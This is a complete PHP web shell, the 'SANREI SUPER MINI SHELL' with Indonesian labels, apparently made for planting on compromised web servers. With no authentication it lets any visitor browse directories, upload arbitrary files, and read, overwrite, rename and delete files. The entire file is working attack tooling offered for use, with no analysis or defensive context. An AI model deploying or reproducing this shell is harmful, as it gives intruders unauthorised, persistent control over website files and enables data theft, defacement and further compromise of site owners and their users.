<!-- HackDitNime Official -->
<?php error_reporting(0); ?>
<!DOCTYPE html>
<html>
<head>
	<title>SUPER MINI SHELL</title>
	<link href="https://fonts.googleapis.com/css2?family=Courgette&family=Cuprum:ital@1&family=Rowdies&display=swap" rel="stylesheet"> 
</head>
<style>
	* {
		font-family: cursive;
		color: #fff;
		font-family: 'Cuprum', sans-serif;
	}
	body {
        background-image: url('https://media0.giphy.com/media/VXhUTVzvNmlRm/giphy.gif');
		background-repeat: no-repeat;
		background-attachment:fixed;
		background-size: cover;
	}
	body h1{
		color: cyan;
		text-shadow: 2px 2px 2px #191919;
		font-size: 50px;
	}
	.dir {
		text-align: center;
		font-size: 30px;
	}
	.dir a{
		text-decoration: none;
		color: #7e52c6;
		text-shadow: 1px 1px 1px #191919;

	}
	.dir a:hover{
		text-decoration: none;
		color: cyan;
	}
	table {
		border: 3px #fff dotted;
		border-collapse: collapse;
		margin: 12px auto;
		height: 100%;
		font-size: 20px;
	}
	table, tr, th, td {
		border: 3px #fff dotted;
		border-collapse: collapse;
		align-items: center;
		text-align: center;
	}
	table,td a {
		text-decoration: none;
		color:#7e52c6;
		text-shadow: 1px 1px 1px #191919;
	}
	table,td a:hover {
		text-decoration: none;
		color: #fff;
	}
	td, a {
		text-decoration: none;
	}
	.button1 {
		width: 50px;
		height: 20px;
		margin: auto;
		padding: 3px;
		color: #fff;
		border: 1px #191919 dotted;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1 a{
		width: 50px;
		height: 20px;
		margin: auto;
		padding: 3px;
		color: cyan;
		border: 1px #fff dotted;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1:hover {
		text-shadow: 0px 0px 5px #fff;
		box-shadow: .5px .5px .3px .3px #555;
		text-decoration: none;
		color: cyan;
	}
	input,select{
		border: 3px #FFF dotted;
		-moz-border-radius: 10px;
		-webkit-border-radius: 10px;
		border-radius: 6px;
		background: transparent;
	}
	textarea {
		border: 1px solid #7e52c6;
		border-radius: 5px;
		box-shadow: 1px 1px 1px 1px #fff;
		width: 100%;
		height: 400px;
		padding-left: 10px;
		margin: 10px auto;
		resize: none;
		background: transparent;
		color: #ffffff;
		font-family: 'Cuprum', sans-serif;
		font-size: 13px;
	}
</style>
<body>
	<center><h1><a href="?" class="button1">SANREI SUPER MINI SHELL</a></h1></center>
	<br>
  <div class="dir">
	<?php  
	if (isset($_GET['dir'])) {
			$dir = $_GET['dir'];
		} else {
			$dir = getcwd();
		}

		$dir = str_replace("\\", "/", $dir);
		$dirs = explode("/", $dir);

		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<a href="/">/</a>'; continue;
			} echo '<a href="?dir=';

			for ($i=0; $i <= $key ; $i++) { 
				echo "$dirs[$i]"; if ($key !== $i) echo "/";
			} echo '">'.$value.'</a>/';
	}
	if (isset($_POST['submit'])){

		$namafile = $_FILES['upload']['name'];
		$tempatfile = $_FILES['upload']['tmp_name'];
		$tempat = $_GET['dir'];
		$error = $_FILES['upload']['error'];
		$ukuranfile = $_FILES['upload']['size'];

		move_uploaded_file($tempatfile, $dir.'/'.$namafile);
				echo "<font color='#7e52c6'>Berhasil Terupload!</font><br/>";
						

	
	}
	?>

	<form method="post" enctype="multipart/form-data">
		<input type="file" name="upload">
		<input type="submit" name="submit" value="Upload">
		
	</form>

  </div>
<table width="700" border="5" cellpadding="5" cellspacing="5" align="center">
	<tr>
		<th>Nama File</th>
		<th>Size</th>
		<th>Action</th>
	</tr>
	<?php
	$scan = scandir($dir);

foreach ($scan as $directory) {
	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

	echo '
	<tr>
	<td><a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
	<td>--</td>
	<td>NONE</td>
	</tr>
	';
	} 
foreach ($scan as $file) {
	if (!is_file($dir.'/'.$file)) continue;

	$jumlah = filesize($dir.'/'.$file)/1024;
	$jumlah = round($jumlah, 3);
	if ($jumlah >= 1024) {
		$jumlah = round($jumlah/1024, 2).'MB';
	} else {
		$jumlah = $jumlah .'KB';
	}

	echo '
	<tr>
	<td><a href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
	<td>'.$jumlah.'</td>
	<td>
	<a href="?dir='.$dir.'&rename='.$dir.'/'.$file.'&nama='.$file.'" class="button1">Rename</a>
	<a href="?dir='.$dir.'&ubah='.$dir.'/'.$file.'" class="button1">Edit</a>
	<a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'" class="button1">Hapus</a>
	</td>
	</tr>
	';
}
if (isset($_GET['open'])) {
	echo '
	<br />
	<style>
		table {
			display: none;
		}
	</style>
	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
	';
}

if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo "<font color='#7e52c6'>File Terhapus</font><br/>";
	}
}
if (isset($_GET['ubah'])) {
	echo '

		<style>
			table {
				display: none;
			}
		</style>

		<a href="?dir='.$dir.'" class="button1">Back</a>
		<form method="post" action="">
		<input type="hidden" name="object" value="'.$_GET['ubah'].'">
		<textarea name="edit">'.htmlspecialchars(file_get_contents($_GET['ubah'])).'</textarea>
		<center><button type="submit" name="go" value="Submit" class="button1">Save</button></center>
		</form>

		';
}
if (isset($_POST['edit'])) {
	$data = fopen($_POST["object"], 'w');
	if (fwrite($data, $_POST['edit'])) {
		echo '<font color="#7e52c6">File Terhapus</font><br/>';
	} else {
		echo "Gagal Edit File";
	}
}

if($_GET['rename']){
	if(isset($_POST['newname'])){
		if(rename($_GET['rename'], $_GET['dir'] . '/' .$_POST['newname'])){
			echo '<font color="#7e52c6">Ganti Nama Berhasil</font><br/>';
		}else{
			echo '<font color="red">Ganti Nama Gagal</font><br />';
		}
	}
echo '<br><center><form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_GET['nama'].'" />
<input type="hidden" name="path" value="'.$_GET['dir'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form></center>';
}

?>
</table>
</body>
</html>